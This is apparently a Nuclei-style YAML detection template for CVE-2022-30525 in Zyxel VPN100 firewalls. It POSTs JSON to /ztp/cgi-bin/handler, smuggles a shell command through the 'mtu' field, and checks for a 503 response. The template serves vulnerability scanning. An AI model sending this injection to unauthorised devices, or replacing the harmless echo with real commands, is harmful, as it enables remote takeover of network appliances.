id: yaml-poc-zyxel-vpn100-unauthorized_access-CVE-2022-30525
info:
  name: Yaml Poc Zyxel Vpn100 Unauthorized_Access Cve 2022 30525
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-zyxel-vpn100-unauthorized_access-CVE-2022-30525'
  tags: unauth,cve
  classification:
    cve-id: CVE-2022-30525
  reference:
  - http://packetstormsecurity.com/files/167176/Zyxel-Remote-Command-Execution.html
  - http://packetstormsecurity.com/files/167182/Zyxel-Firewall-ZTP-Unauthenticated-Command-Injection.html
  - http://packetstormsecurity.com/files/167372/Zyxel-USG-FLEX-5.21-Command-Injection.html
  - http://packetstormsecurity.com/files/168202/Zyxel-Firewall-SUID-Binary-Privilege-Escalation.html
  - https://cxsecurity.com/cveshow/CVE-2022-30525/
http:
- method: POST
  path:
  - /ztp/cgi-bin/handler
  body: '{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":";
    echo a:`expr {{s1}} + {{s2}}`;","data":""}'
  headers:
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 503
